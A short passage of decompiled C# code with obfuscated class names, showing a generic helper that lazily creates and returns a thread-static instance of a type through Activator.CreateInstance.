			if (Class145.Class148<T>.gparam_0 == null)
			{
				Class145.Class148<T>.gparam_0 = Activator.CreateInstance<T>();
			}
			return Class145.Class148<T>.gparam_0;
		}

		// Token: 0x040008A1 RID: 2209
		[ThreadStatic]
		private static T gparam_0;
	}
}
